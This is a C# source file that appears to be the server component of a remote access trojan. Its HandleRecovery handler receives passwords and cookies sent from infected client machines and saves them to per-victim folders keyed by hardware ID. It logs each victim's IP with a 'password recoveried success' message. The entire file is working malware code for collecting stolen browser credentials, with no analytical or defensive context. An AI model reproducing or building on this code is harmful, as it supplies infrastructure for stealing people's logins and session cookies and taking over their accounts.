using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Handle_Packet
{
    public class HandleRecovery
    {
        public HandleRecovery(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                var fullPath = Path.Combine(Application.StartupPath, "ClientsFolder",
                    unpack_msgpack.ForcePathObject("Hwid").AsString, "Recovery");
                var pass = unpack_msgpack.ForcePathObject("Logins").AsString;
                var cookies = unpack_msgpack.ForcePathObject("Cookies").AsString;
                if (!string.IsNullOrWhiteSpace(pass) || !string.IsNullOrWhiteSpace(cookies))
                {
                    if (!Directory.Exists(fullPath))
                        Directory.CreateDirectory(fullPath);
                    File.WriteAllText(fullPath + "\\Password_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt",
                        pass.Replace("\n", Environment.NewLine));
                    File.WriteAllText(fullPath + "\\Cookies_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt",
                        cookies);
                    new HandleLogs().Addmsg(
                        $"Client {client.Ip} password recoveried success，file located @ ClientsFolder \\ {unpack_msgpack.ForcePathObject("Hwid").AsString} \\ Recovery",
                        Color.Purple);
                }
                else
                {
                    new HandleLogs().Addmsg($"Client {client.Ip} password recoveried error", Color.MediumPurple);
                }

                client?.Disconnected();
            }
            catch (Exception ex)
            {
                new HandleLogs().Addmsg(ex.Message, Color.Red);
            }
        }
    }
}